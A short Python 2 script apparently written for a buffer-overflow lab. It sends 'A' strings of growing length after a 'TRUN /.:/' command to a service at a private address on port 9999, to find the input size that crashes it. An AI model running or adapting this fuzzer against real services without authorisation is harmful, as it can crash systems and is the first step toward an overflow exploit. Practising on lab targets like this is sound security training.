#! /home/anests1a/Downloads/Python-2.7.18/python

import socket

import sys

buffer = ["A"]

counter =  100

while len(buffer) <= 30:

    buffer.append("A"*counter)

    counter=counter+200

for string in buffer:

    print "Performing fuzzing with %s bytes " % len(string)

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    connect=s.connect(('172.16.215.129',9999))

    s.send(('TRUN /.:/' + string))

    s.close()
